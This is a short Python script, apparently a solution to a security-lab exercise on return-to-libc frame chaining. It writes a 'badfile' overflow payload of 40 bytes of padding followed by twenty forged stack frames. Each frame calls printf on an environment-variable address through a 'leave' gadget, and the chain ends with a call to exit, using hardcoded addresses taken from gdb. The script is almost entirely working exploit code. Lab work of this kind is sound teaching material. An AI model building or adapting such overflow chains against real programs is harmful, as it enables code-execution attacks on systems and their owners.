#!/usr/bin/python3

def tobytes(value):
    return (value).to_bytes(4, byteorder="little")


def main():
    leave_addr  = 0x080485df    # from gdb stackRope -> 'leave'
    printf_addr = 0x80483a0     # from gdb stackRope
    exit_addr   = 0xb7e369d0    # from gdb stackRope
    sh_addr     = 0xbffffde9    # address of environment variable 
    foo_ebp     = 0xbfffed18    # foo ebp value
    next_ebp    = foo_ebp
    skip_ebp    = 32            # leave room for up to 4 arguments
    offset      = 40            # distance between buffer start and ebp

    # Pad the offset of overflow string with an arbitrary value.
    content = bytearray(0xaa for i in range(offset))

# This code that is part of the lab program can be commented out and
# everything works just fine. All it does in jump up 32 bytes and then
# the for loop jumps it up another 32 bytes before starting the calls
# to printf().
#
    # From foo() to first function call.
#   next_ebp += skip_ebp
#   content += tobytes(next_ebp)
#   content += tobytes(leave_addr)
    # Append arbitrary data to fill up rest of 'skip_ebp' byte space.
#   content += bytearray(0xaa for i in range(skip_ebp - (2*4)))

    for i in range(20):
        next_ebp += skip_ebp            # jump address + skip value
        content += tobytes(next_ebp)    # ebp address skip_ebp bytes away
        content += tobytes(printf_addr) # this is the return address
        content += tobytes(leave_addr)  # baz() argument
        content += tobytes(sh_addr)     # address of environment variable

        # Append arbitrary data to fill up rest of 'skip_ebp' byte space.
        content += bytearray(0xaa for i in range(skip_ebp - (4*4)))
        
    # Invoke exit() to exite gracefully at end.
    content += tobytes(0xffffffff)      # next ebp value never used
    content += tobytes(exit_addr)

    # Write the string to a file.
    with open("badfile", "wb") as f:
        f.write(content)


if __name__ == "__main__":
    main()
